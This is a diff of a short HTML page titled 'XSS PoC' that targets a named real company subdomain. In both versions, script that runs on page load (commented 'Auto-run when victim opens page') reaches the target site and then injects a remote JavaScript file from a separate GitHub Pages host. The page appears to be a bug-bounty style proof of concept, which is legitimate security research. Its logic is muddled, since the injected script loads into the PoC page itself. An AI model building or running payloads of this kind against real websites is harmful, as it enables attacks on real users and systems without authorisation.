@@ -1,19 +1,20 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>XSS PoC</title>
-    <script>
-      // Redirect to vulnerable page and auto-load x.js
-      location.href = "https://worker-adhoc-shifts.indeed.com/#xss";
-      setTimeout(() => {
+<head>
+  <meta charset="UTF-8">
+  <title>XSS PoC</title>
+  <script>
+    // Auto-run when victim opens page
+    fetch("https://worker-adhoc-shifts.indeed.com/#")
+      .then(() => {
         const s = document.createElement("script");
         s.src = "https://amirwilayah.github.io/indeed-xss-poc-/x.js";
         document.head.appendChild(s);
-      }, 3000); // wait for redirect to load
-    </script>
-  </head>
-  <body>
-    Redirecting...
-  </body>
+      })
+      .catch(console.error);
+  </script>
+</head>
+<body>
+  <h1>XSS PoC Loading…</h1>
+</body>
 </html>
